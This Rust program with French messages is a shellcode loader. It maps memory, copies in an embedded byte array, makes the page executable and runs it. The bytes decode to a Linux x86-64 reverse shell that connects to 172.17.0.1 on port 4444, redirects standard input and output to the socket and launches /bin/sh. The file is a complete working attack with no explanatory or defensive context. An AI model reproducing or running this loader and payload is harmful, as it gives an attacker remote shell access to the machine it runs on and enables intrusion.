use std::ptr;
use libc::{mmap, mprotect, MAP_ANON, MAP_PRIVATE, PROT_READ, PROT_WRITE, PROT_EXEC};

fn main() {
    let shellcode: &[u8] = &[
        0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x6a,
    0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x6a, 0x06, 0x5a, 0xb0, 0x29, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48,
    0x31, 0xc0, 0x50, 0xbe, 0xac, 0x11, 0x00, 0x01, 0x56, 0x66, 0x68, 0x11, 0x5c, 0x66, 0x6a, 0x02,
    0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0xb0, 0x2a, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0x6a, 0x03, 0x5e,
    0x48, 0xff, 0xce, 0xb0, 0x21, 0x0f, 0x05, 0x75, 0xf8, 0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f,
    0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x48, 0x89, 0xe2, 0x57,
    0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05
    ];

    unsafe {
        let page_size = 4096;
        let addr = mmap(
            ptr::null_mut(),
            page_size,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANON,
            -1,
            0,
        );

        if addr == libc::MAP_FAILED {
            panic!("Erreur mmap");
        }
        println!("Mémoire allouée à {:p}", addr);

        ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
        println!("Shellcode injecté");

        if mprotect(addr, page_size, PROT_READ | PROT_EXEC) != 0 {
            panic!("Erreur mprotect");
        }
        println!("Permissions RX aplliquées");

        println!("Execution du payload...");
        let exec: extern "C" fn() = std::mem::transmute(addr);
        exec();
    }
}
